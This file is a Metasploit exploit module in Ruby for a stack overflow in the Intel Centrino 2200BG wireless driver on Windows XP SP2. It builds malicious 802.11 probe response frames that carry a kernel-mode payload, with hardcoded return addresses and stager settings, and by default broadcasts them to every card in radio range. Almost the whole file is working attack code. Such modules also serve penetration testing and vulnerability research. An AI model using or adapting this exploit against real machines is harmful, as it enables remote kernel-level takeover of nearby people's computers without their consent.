##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Driver::Intel_Centrino_2200BG_driver_probe < Msf::Exploit::Remote

	include Exploit::Lorcon
	include Exploit::KernelMode	

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Intel Centrino 2200BG Wireless Driver Probe Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in the w22n51.sys driver provided
			with the Intel 2200BG integrated wireless adapter. This stack overflow 
			allows remote code execution in kernel mode. The stack overflow is triggered
			when a 802.11 Probe response frame is received that contains multi vendor specific tag 
			and "\x00" as essid and essid length element. This exploit was tested with version 8.0.12.20000 
			of the  driver and an Intel Centrino 2200BG integrated wireless adapter. Newer
			versions of the w22n51.sys driver are provided from Intel to resolve this flaw.
			Since this vulnerability is exploited via probe response frames, all cards within 
			range of the attack will be affected. 
			
			Vulnerable clients don't need to have their card in a particular state for this exploit 
			to work.
			
			This module depends on the Lorcon library and only works on the Linux platform
			with a supported wireless card. Please see the Ruby Lorcon documentation 
			(external/ruby-lorcon/README) for more information.
			},
			
			'Author'         => 
				[
					'oveRet \'Giuseppe Gottardi\' <overet [at] securitydate.it', 	# exploit dev
					'skape'								# windows kernel ninjitsu
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 4529 $',
			'References'     =>
				[
					['URL', 'http://www.kb.cert.org/vuls/id/524332'],
					['URL', 'http://www.milw0rm.org/exploits/3158'],
					['URL', 'http://overet.securitydate.it/stuff/2200BG_8.0.12.20000_drivers.zip']
				],
			'Privileged'     => true,
                        
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},

			'Payload'        =>
				{
					'Space'    => 224
				},
			'Platform'       => 'win',
			'Targets'        => 
				[
					# Windows XP SP2
					# 5.1.2600 (xpsp_sp2_gdr.070227-2254)
					[ 'Windows XP SP2 (5.1.2600), w22n51.sys 8.0.12.20000',
						{
							'Ret'      => 0x8054eb62,
							'Platform' => 'win',
							'Payload'  => 
							{
								'ExtendedOptions' => 
								{
									'Stager'       => 'sud_syscall_hook',	# don't change this
									'PrependUser'  => "\xeb\x02" + 		# required jump
											  "\x85\xe0",		# fixed max len
									'Recovery'     => 'idlethread_restart',
									'KiIdleLoopAddress' => 0x804dbb27,
								}
							}
						} 
					]
				],


			'DefaultTarget' => 0
			))
			
		register_options(
			[
				OptString.new('ADDR_DST', [ true,  "The MAC address to send this to",'FF:FF:FF:FF:FF:FF']),
				OptInt.new('RUNTIME', [ true,  "The number of time to run the attack", 1000]),
				OptInt.new('DELAY', [ true,  "The number of seconds to sleep between the packets", 1]),
			], self.class)
	end
	
	def exploit
		open_wifi
		
                rtime = datastore['RUNTIME'].to_i
		dtime = datastore['DELAY'].to_i
		count = 0

		print_status("Sending probe exploit to #{datastore['ADDR_DST']}...")
		print "[-] "

		while (count < rtime)
			wifi.write(create_beacon)
			select(nil, nil, nil, 0.10) if (count % 100 == 0)
			count += 1
			#Exit if we get a session
			break if session_created?
                        
			print "#"
			sleep(dtime)
		end

		print "\n"
		print_status("Completed sending probe.")
	end
 
	def create_beacon
		bssid  = ("\x43" * 6)
		src    = ("\x43" * 6)
		seq    = [rand(255)].pack('n')

		fill   = 0xe0 - (payload.encoded.length - 125)
		
		frame =
			"\x50" +                      # type/subtype
			"\x00" +                      # flags
			"\x3a\x01" +                  # duration  
			eton(datastore['ADDR_DST']) + # dst
			src   +                       # src
			bssid +                       # bssid
			seq   +                       # seq  
			rand_text(8) +      	      # timestamp value
			"\xa0\x0f" +                  # beacon interval
			"\x31\x08" +                  # capability flags
			
			# ssid tag
			"\x00\x00" +

			# supported rates
			"\x01" + "\x01" + "\x82" +

			# current channel
			"\x03" + "\x01" + channel.chr +
			
			# fixed max len
			"\x85\x7b" +

			payload.encoded +
			
			# fill to reach e0 length
			("\x41" * fill) +

			# vendor specific tag
			"\xdd" +
			"\x18" +
			"\x00\x50\xf2\x02\x01\x01\x89\x00\x03\xa5\x00\x00\x27\xa5\x00\x00" +
			"\x42\x54\xbc\x00\x62\x43\x66\x00" +
			
			# vendor specific tag
			"\xdd" +
			"\x10" +
			"\x00\x50\xf2\x05\x00\x01\x00\x04\x00\x00\x83\x07" +
			
			# RET address
			[target['Ret']].pack('V')
								
		return frame
	end
end
end
